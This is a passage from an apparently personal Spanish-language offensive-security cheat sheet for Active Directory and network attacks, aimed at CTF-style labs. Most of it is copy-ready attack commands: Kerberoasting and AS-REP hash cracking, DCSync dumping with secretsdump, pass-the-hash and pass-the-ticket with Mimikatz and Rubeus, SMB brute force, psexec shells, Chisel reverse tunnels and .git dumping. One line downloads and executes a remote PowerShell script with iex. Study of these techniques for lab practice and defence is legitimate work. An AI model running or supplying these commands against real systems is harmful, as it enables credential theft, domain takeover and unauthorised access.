john --wordlist=rockyou.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt 
`

## DCSync Attack 

El ataque DCSync consiste en "Simular" ser un Domain Controller, con ello, intentamos replicar los hashes de un Domain Controller ya existente.

`python3 secretdump.py 'domain\user:password@ip'`  # el usuario tiene que tener el privilegio de replicar un controlador de dominio

## Kerberoasting

*El objetivo de Kerberoasting es recopilar tickets TGS para servicios que se ejecutan en nombre de cuentas de usuario en AD, no cuentas de computadora*

`GetUserSPNs.py -request -dc-ip 10.10.10.18 -hashes <LMHASH>:<NTHASH> domain.htb/john -outputfile hashes.kerberoast` # Obtener TicketsGrantingServices
 
 #### Windows mode

`
Request-SPNTicket -SPN "<SPN>" #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
`


## PASS THE HASH

*Una vez que tenga el hash de la víctima , puede usarlo para hacerse pasar por ella. Debe usar una herramienta que realice la autenticación NTLM usando ese hash , o puede crear un nuevo inicio de sesión e inyectar ese hash dentro del LSASS , de modo que cuando se realice cualquier autenticación NTLM , se usará ese hash.*

`Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.htb /ntlm:NTLMhash /run:powershell.exe"' ` # Usamos mimikatz en la maquina victima, este ataque tambien se puede efectuar con usuarios del ordenador, no solo del dominio.


## PASS THE TICKET 

*Este tipo de ataque es similar a Pass the Key, pero en lugar de usar hashes para solicitar un ticket, el ticket en sí es robado y utilizado para autenticarse como propietario*


`mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi" 
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi` #Cargamos el ticket en memoria

`
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd`  # Listamos el ticket en la cache de la memoria

## BloodHound

*Escribir material de apoyo sobre escaladas de priv*
*Subir bloodhound-python*

### BloodHound.py

De manera predeterminada, BloodHound.py consultará LDAP y las computadoras individuales del dominio para enumerar usuarios, computadoras, grupos, sesiones y administradores locales, como mínimo necesitará las credenciales del dominio en el que está iniciando sesión. Deberá especificar la opción -u con un nombre de usuario de este dominio (o nombre de usuario@dominio para un usuario en un dominio de confianza). Si tiene su DNS configurado correctamente y el dominio AD está en su lista de búsqueda de DNS, BloodHound.py detectará automáticamente el dominio. De lo contrario, debe especificarlo manualmente con la opción -d .

`BloodHound.py -u 'f.smith' -p 'password' -d 'domain.htb' -c all`


# SMB

## Enumeración

`nmap --min-rate 5000 -p139,445 -vvv -Pn <ip>` # Miramos si tenemos el servicio SMB abierto

`enum4linux -a [-u "<username>" -p "<passwd>"] <IP>` # Dumpeamos información con enum4linux

`map --script "safe or smb-enum-*" -p 445 <IP>` # Lanzamos scripts de nmap para smb

`enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>` # Utilizamos enum4linux para intentar conectarnos a servicios compartidos de smb

`smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`  # Utilizamos smbmap para intentar conectarnos a servicios compartidos de smb

`smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //` #  # Utilizamos smbclient para intentar conectarnos a servicios compartidos de smb


## Listar carpetas

`smbmap -H <IP> ` # Listamos con smbmap las carpetas. Sin proporcionar credenciales.

`smbmap -H <IP> -u "username" -p "password" `  # Listamos con credenciales validas

`crackmapexec smb <IP> -u '' -p '' --shares ` # Listamos con crackmapexec, sin credenciales.

## Crear servidor SMB

`./smbserver.py <name_server> <path>` # Montamos servidor smb para compartir recursos

## Shell desde SMB

`./psexec.py 'user:pass'@<ip>` # ejecutamos shell desde SMB

# RPC

`rpcclient -U "" -N <IP> ` # Conectamos con rpc, con una sesión nula.

## Enumeración de usuarios 

```
Lista de usuarios : enumdomusers 

Obtener detalles del usuario :queryuser <0xrid> 

Obtener grupos de usuarios :queryusergroups <0xrid> 

OBTENER SID de un usuario :lookupnames <username> 
 
Obtener alias de usuarios :queryuseraliases [builtin|domain] <sid>
```


## Enumeración de grupos 
```
Lista de grupos :enumdomgroups 

Obtener detalles del grupo :querygroup <0xrid> 

Obtener miembros del grupo :querygroupmem <0xrid> 
```


## Enumeración de grupos de alias 

```
Lista de alias :enumalsgroups <builtin|domain> 

Obtener miembros :queryaliasmem builtin|domain <0xrid> 
```

## Enumeración de dominios 
``` 
Lista de dominios : enumdomains Obtener SID :lsaquery 
información de dominio :querydominfo 
```

## BruteForce User/Password/SID

`nmap --script smb-brute.nse -p445 <IP>` # script de nmap, brute force.

`crackmapexec smb <IP> -u 'admin' -p wordlist_pass.txt # or # crackmapexec smb <IP> -u 'wordlist_user.txt' -p password ` # fuerza bruta para usuario o password, con diccionario.

`lookupsid.py ignite/Administrator:Ignite@987@192.168.1.105` # "Bruteforcea los usuarios en busca del SID, es necesario credenciales válidas y el nombre del dominio.


## Más SID 
```
Encuentre SID por nombre :lookupnames <username> 
Encuentre más SID :lsaenumsid Ciclo RID (verifique más SID) :lookupsids <sid>
```

# PORT FORWARDING 

## SSH Local port forwarding
 *Local (Redirección de puertos local): Reenvía un puerto local a un host remoto.*
 
`ssh user@domain.htb -L 9000:localhost:3306` # Desde nuestro puerto 9000, creamos un túnel al puerto 3306 del host remoto.
 
## SSH Remote port forwarding
 *Remote (Redirección de puertos Remotos): Permite conectarse desde el servidor SSH remoto a otro servidor.*
 
`ssh -R 5500:localhost:5500 user@htb.htb`

## Chisel 

`./chisel server -p 8000 --reverse ` # En nuestra maquina atacante 

`./chisel client <ip-host-remote>:8000 R:80:localhost:80` # En la maquina victima


# GIT

`./gitdumper.sh http://domain.htb/.git/ /Path/git` # dumpeamos el git

`cd /Path/git && git status` # vemos los ultimos commit

`git commit #number#` # Leemos el commit seleccionado.

`git reset --hard` # recuperamos el ultimo commit

`./extractor.sh /.git/ extracted` # Paso automatico para leer/recuperar el dumpeo del git.

# PORT KNOCKING

Una practica para ocultar puertos.
Los puertos principalmente permanecen cerrados, una vez se hace una secuencias de "golpeos" sobre unos puertos especificos, este puerto oculto, pasar

`nmap <ip> -p <port1>,<port2>,... -r --max-retries 0 --max-parallelism 1 -sT --scan-delay 200ms --max-rtt-timeout 200ms -Pn` # golpeo de puertos, con nmap.

`knock <ip> <ports>` # golpeo de puertos con script "knock"

# Webs para practicar

- HackTheBox
- TryHackMe
- Provide Grounds (Offensive Security) 
- Portswigger.net
- 
